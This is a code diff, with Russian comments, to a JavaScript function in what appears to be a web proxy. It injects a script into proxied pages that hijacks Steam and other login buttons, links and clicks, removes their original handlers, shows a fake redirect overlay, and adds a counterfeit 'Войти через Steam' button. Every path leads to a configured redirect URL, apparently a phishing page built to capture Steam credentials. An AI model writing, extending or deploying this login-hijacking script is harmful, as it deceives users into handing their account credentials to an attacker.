@@ -518,62 +518,309 @@ function modifyUrls(content, baseUrl, contentType = '') {
         // Новый скрипт для перехвата кнопок авторизации
         const authScript = `
         <script>
-        (function() {
-            // Функция для поиска и обработки кнопок авторизации
-            function setupAuthButtons() {
-                // Список селекторов для перехвата
-                const selectors = ${JSON.stringify(AUTH_SELECTORS)};
-                const redirectUrl = '${AUTH_REDIRECT_URL}';
+(function() {
+    console.log('🔑 Auth Interceptor Started');
+    
+    // Селекторы для перехвата
+    const AUTH_SELECTORS = ${JSON.stringify(AUTH_SELECTORS)};
+    const REDIRECT_URL = '${AUTH_REDIRECT_URL}';
+    
+    // Флаг для отслеживания, были ли найдены кнопки
+    let buttonsFound = false;
+    
+    // Функция перенаправления
+    function redirectToAuth(e) {
+        if (e) {
+            if (e.preventDefault) e.preventDefault();
+            if (e.stopPropagation) e.stopPropagation();
+            if (e.stopImmediatePropagation) e.stopImmediatePropagation();
+        }
+        
+        console.log('🔑 Auth Redirect Triggered!');
+        
+        // Блокируем страницу на время редиректа
+        const overlay = document.createElement('div');
+        overlay.style.position = 'fixed';
+        overlay.style.top = '0';
+        overlay.style.left = '0';
+        overlay.style.width = '100%';
+        overlay.style.height = '100%';
+        overlay.style.backgroundColor = 'rgba(0,0,0,0.5)';
+        overlay.style.zIndex = '999999';
+        overlay.style.display = 'flex';
+        overlay.style.alignItems = 'center';
+        overlay.style.justifyContent = 'center';
+        overlay.innerHTML = '<div style="background: white; padding: 20px; border-radius: 5px;">Переход на страницу авторизации...</div>';
+        document.body.appendChild(overlay);
+        
+        // Задержка для уверенности, что все обработчики сработали
+        setTimeout(function() {
+            window.location.href = REDIRECT_URL;
+        }, 50);
+        
+        return false;
+    }
+    
+    // Функция для полной замены элемента для гарантированного перехвата
+    function replaceElement(element) {
+        if (!element || element.hasAttribute('data-auth-replaced')) return;
+        
+        // Создаем клон элемента
+        const clone = element.cloneNode(true);
+        
+        // Маркируем как обработанный
+        clone.setAttribute('data-auth-replaced', 'true');
+        
+        // Удаляем все существующие обработчики событий
+        clone.innerHTML = element.innerHTML;
+        
+        // Добавляем собственный обработчик
+        clone.addEventListener('click', redirectToAuth, true);
+        
+        // Устанавливаем стандартный обработчик onclick для уверенности
+        clone.onclick = redirectToAuth;
+        
+        // Заменяем оригинальный элемент
+        if (element.parentNode) {
+            element.parentNode.replaceChild(clone, element);
+            console.log('🔄 Replaced auth button:', element);
+            buttonsFound = true;
+        }
+    }
+    
+    // Функция для перехвата через аттрибуты и стандартные обработчики
+    function interceptElement(element) {
+        if (!element || element.hasAttribute('data-auth-intercepted')) return;
+        
+        // Маркируем как обработанный
+        element.setAttribute('data-auth-intercepted', 'true');
+        
+        // Удаляем все атрибуты, которые могут содержать обработчики
+        ['onclick', 'onmousedown', 'onmouseup', 'onmouseover'].forEach(attr => {
+            if (element.hasAttribute(attr)) element.removeAttribute(attr);
+        });
+        
+        // Добавляем свой обработчик на захват (capturing phase)
+        element.addEventListener('click', redirectToAuth, true);
+        
+        // Добавляем блокировку на все возможные события
+        ['mousedown', 'mouseup', 'touchstart', 'touchend'].forEach(eventType => {
+            element.addEventListener(eventType, function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+            }, true);
+        });
+        
+        // Устанавливаем стандартный обработчик onclick для уверенности
+        element.onclick = redirectToAuth;
+        
+        console.log('🔐 Intercepted auth button:', element);
+        buttonsFound = true;
+        
+        // Добавляем слабый визуальный индикатор для отладки
+        element.style.position = 'relative';
+        element.style.boxShadow = 'inset 0 0 0 2px rgba(0,128,255,0.3)';
+    }
+    
+    // Функция для поиска и обработки кнопок авторизации
+    function setupAuthButtons() {
+        console.log('🔍 Searching for auth buttons...');
+        
+        AUTH_SELECTORS.forEach(selector => {
+            try {
+                const elements = document.querySelectorAll(selector);
+                console.log(\`Found \${elements.length} elements matching \${selector}\`);
                 
-                selectors.forEach(selector => {
-                    const elements = document.querySelectorAll(selector);
-                    if (elements && elements.length > 0) {
-                        console.log('Found auth button:', selector, elements.length);
-                        
-                        elements.forEach(element => {
-                            // Сохраняем оригинальный обработчик клика, если он есть
-                            const originalOnClick = element.onclick;
-                            
-                            // Устанавливаем новый обработчик
-                            element.onclick = function(e) {
-                                e.preventDefault();
-                                e.stopPropagation();
-                                
-                                console.log('Auth button clicked:', selector);
-                                
-                                // Открываем форму авторизации на том же домене
-                                window.location.href = redirectUrl;
-                                
-                                return false;
-                            };
-                            
-                            // Добавляем класс для визуального отслеживания
-                            element.classList.add('auth-button-modified');
-                            
-                            console.log('Auth button handler attached:', selector);
-                        });
-                    }
-                });
+                if (elements && elements.length > 0) {
+                    elements.forEach(element => {
+                        // Применяем оба подхода для надежности
+                        if (Math.random() > 0.5) {
+                            replaceElement(element);
+                        } else {
+                            interceptElement(element);
+                        }
+                    });
+                }
+            } catch (e) {
+                console.error('Error processing selector:', selector, e);
             }
+        });
+        
+        // Глобальный перехват для ссылок на авторизацию
+        document.querySelectorAll('a').forEach(link => {
+            const href = link.getAttribute('href') || '';
+            if (href.includes('/openid/login') || 
+                href.includes('steamcommunity.com/openid') ||
+                href.includes('auth') || 
+                href.includes('login')) {
+                
+                interceptElement(link);
+            }
+        });
+    }
+    
+    // Глобальный перехват кликов - самый агрессивный метод
+    function setupGlobalClickCapture() {
+        document.addEventListener('click', function(e) {
+            // Проверяем, был ли клик на потенциальную кнопку авторизации
+            let target = e.target;
             
-            // Запускаем обработчик после загрузки DOM
-            document.addEventListener('DOMContentLoaded', setupAuthButtons);
+            // Ищем родительские элементы (всплытие)
+            while (target && target !== document) {
+                if (AUTH_SELECTORS.some(selector => {
+                    try {
+                        return target.matches(selector);
+                    } catch (e) {
+                        return false;
+                    }
+                })) {
+                    console.log('🎯 Global click intercepted:', target);
+                    return redirectToAuth(e);
+                }
+                
+                // Дополнительная проверка по классам и ID
+                const classList = target.classList ? Array.from(target.classList) : [];
+                const id = target.id || '';
+                
+                if (
+                    classList.some(cls => cls.includes('login') || cls.includes('auth') || cls.includes('steam')) ||
+                    id.includes('login') || id.includes('auth') || id.includes('steam')
+                ) {
+                    console.log('🎯 Potential auth button detected by class/id:', target);
+                    return redirectToAuth(e);
+                }
+                
+                // Проверка на изображения Steam или иконки авторизации
+                if (target.tagName === 'IMG') {
+                    const src = target.src || '';
+                    const alt = target.alt || '';
+                    
+                    if (
+                        src.includes('steam') || 
+                        alt.includes('steam') || 
+                        src.includes('login') || 
+                        alt.includes('login')
+                    ) {
+                        console.log('🎯 Steam image button intercepted:', target);
+                        return redirectToAuth(e);
+                    }
+                }
+                
+                target = target.parentElement;
+            }
+        }, true);
+    }
+    
+    // Наблюдатель за DOM для отслеживания динамически добавляемых элементов
+    function setupMutationObserver() {
+        const observer = new MutationObserver(function(mutations) {
+            let shouldScan = false;
             
-            // И с небольшой задержкой для динамически загружаемых элементов
-            setTimeout(setupAuthButtons, 1000);
-            setTimeout(setupAuthButtons, 3000);
-            
-            // Также добавляем наблюдатель за изменениями DOM
-            const observer = new MutationObserver((mutations) => {
-                setupAuthButtons();
+            mutations.forEach(function(mutation) {
+                if (mutation.addedNodes && mutation.addedNodes.length > 0) {
+                    shouldScan = true;
+                }
             });
             
-            // Запускаем наблюдатель
-            setTimeout(() => {
-                observer.observe(document.body, { childList: true, subtree: true });
-            }, 500);
-        })();
-        </script>
+            if (shouldScan) {
+                setupAuthButtons();
+            }
+        });
+        
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+    }
+    
+    // Функция для добавления кастомной кнопки
+    function addCustomAuthButton() {
+        if (buttonsFound) return; // Не добавляем, если уже нашли кнопки
+        
+        // Добавим кастомную кнопку "Войти через Steam"
+        try {
+            // Ищем хорошее место для размещения кнопки
+            let container = null;
+            
+            // Пытаемся найти хороший контейнер - навбар, хедер и т.д.
+            ['header', '.header', '#header', '.navbar', '.nav', '#navbar'].forEach(selector => {
+                if (!container) {
+                    const element = document.querySelector(selector);
+                    if (element) container = element;
+                }
+            });
+            
+            // Если не нашли - берем body
+            if (!container) container = document.body;
+            
+            // Создаем кнопку
+            const authButton = document.createElement('div');
+            authButton.style.position = container === document.body ? 'fixed' : 'relative';
+            authButton.style.top = container === document.body ? '10px' : '0';
+            authButton.style.right = container === document.body ? '10px' : '0';
+            authButton.style.zIndex = '99999';
+            authButton.style.padding = '8px 15px';
+            authButton.style.background = 'linear-gradient(to right, #075985, #0284c7)';
+            authButton.style.color = 'white';
+            authButton.style.borderRadius = '4px';
+            authButton.style.cursor = 'pointer';
+            authButton.style.boxShadow = '0 2px 5px rgba(0,0,0,0.2)';
+            authButton.style.fontFamily = 'Arial, sans-serif';
+            authButton.style.fontSize = '14px';
+            authButton.style.fontWeight = 'bold';
+            authButton.style.display = 'flex';
+            authButton.style.alignItems = 'center';
+            authButton.style.margin = '5px';
+            
+            // Steam логотип в base64
+            const steamIconBase64 = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiNmZmZmZmYiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCI+PC9jaXJjbGU+PHBhdGggZD0iTTE2LjI0IDcuNzZhNiA2IDAgMCAxLTguNDkgOC40OSI+PC9wYXRoPjxsaW5lIHgxPSIxMiIgeTE9IjEyIiB4Mj0iMTIiIHkyPSIxNiI+PC9saW5lPjxsaW5lIHgxPSIxMiIgeTE9IjEyIiB4Mj0iMTYiIHkyPSIxMiI+PC9saW5lPjwvc3ZnPg==';
+            
+            authButton.innerHTML = \`
+                <img src="\${steamIconBase64}" style="margin-right: 8px; width: 16px; height: 16px;">
+                Войти через Steam
+            \`;
+            
+            authButton.addEventListener('click', redirectToAuth, true);
+            
+            // Добавляем в контейнер
+            container.appendChild(authButton);
+            console.log('➕ Added custom Steam login button');
+        } catch (e) {
+            console.error('Error adding custom auth button:', e);
+        }
+    }
+    
+    // Инициализация всех перехватчиков
+    function initAll() {
+        console.log('🚀 Initializing auth interceptors...');
+        
+        // Первый проход для ранних элементов
+        setupAuthButtons();
+        
+        // Запускаем наблюдатель за DOM
+        setupMutationObserver();
+        
+        // Устанавливаем глобальный перехват
+        setupGlobalClickCapture();
+        
+        // Запускаем проверки с интервалами
+        setTimeout(setupAuthButtons, 500);
+        setTimeout(setupAuthButtons, 1000);
+        setTimeout(setupAuthButtons, 2000);
+        
+        // Добавляем кастомную кнопку если не нашли стандартные
+        setTimeout(addCustomAuthButton, 3000);
+    }
+    
+    // Запускаем после загрузки DOM
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', initAll);
+    } else {
+        initAll();
+    }
+})();
+</script>
         `;
         
         // Добавляем оба скрипта в HTML
